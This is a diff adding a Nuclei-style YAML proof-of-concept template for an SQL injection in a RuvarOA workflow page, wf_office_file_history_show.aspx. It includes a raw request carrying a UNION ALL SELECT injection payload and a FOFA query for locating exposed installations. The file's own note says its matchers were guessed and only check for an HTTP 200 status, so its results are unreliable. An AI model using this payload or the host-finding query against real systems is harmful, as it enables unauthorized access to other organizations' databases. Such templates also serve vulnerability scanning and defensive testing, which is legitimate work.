@@ -1,0 +1,36 @@
+id: poc-257276c44278e02c9aef
+info:
+  name: RuvarOAwf_office_file_history_show存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/257276c44278e02c9aefda475a68dd0c
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 257276c44278e02c9aefda475a68dd0c
+    fofa: + fofa`body="txt_admin_key"`
+http:
+- raw:
+  - 'GET /WorkFlow/wf_office_file_history_show.aspx?id=1%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%28114%29%2BCHAR%28111%29%2BCHAR%2886%29%2BCHAR%2887%29%2BCHAR%2873%29%2BCHAR%28115%29%2BCHAR%2888%29%2BCHAR%2877%29%2BCHAR%28111%29%2BCHAR%28120%29%2BCHAR%2871%29%2BCHAR%28104%29%2BCHAR%28106%29%2BCHAR%2882%29%2BCHAR%2870%29%2BCHAR%2867%29%2BCHAR%28119%29%2BCHAR%28105%29%2BCHAR%2883%29%2BCHAR%2866%29%2BCHAR%28120%29%2BCHAR%28100%29%2BCHAR%2890%29%2BCHAR%28109%29%2BCHAR%28114%29%2BCHAR%2897%29%2BCHAR%2881%29%2BCHAR%2879%29%2BCHAR%28114%29%2BCHAR%28104%29%2BCHAR%28109%29%2BCHAR%2897%29%2BCHAR%2869%29%2BCHAR%2883%29%2BCHAR%28120%29%2BCHAR%28115%29%2BCHAR%2887%29%2BCHAR%2886%29%2BCHAR%28112%29%2BCHAR%2878%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28112%29%2BCHAR%28107%29%2BCHAR%28113%29--+xPaC HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.4103.116 Safari/537.36'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /WorkFlow/wf_office_file_history_show.aspx?id=1 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.4103.116 Safari/537.36'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
